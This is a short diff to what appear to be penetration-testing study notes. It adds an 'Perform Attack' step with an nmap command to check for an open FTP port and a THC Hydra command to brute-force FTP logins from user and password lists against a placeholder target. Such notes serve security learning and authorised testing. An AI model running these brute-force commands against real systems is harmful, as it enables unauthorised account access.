@@ -62,6 +62,8 @@
   5. path: usr --> share --> uniscan --> report
 
 ## Perform Attack
+  THC Hydra tool
   
-    
-  
+  1. ``` nmap -p 21 [target IP] ```
+    Check if FTP open
+  2. ``` hydra -L [userList path] -P [password List path] ftp://[target IP] ```
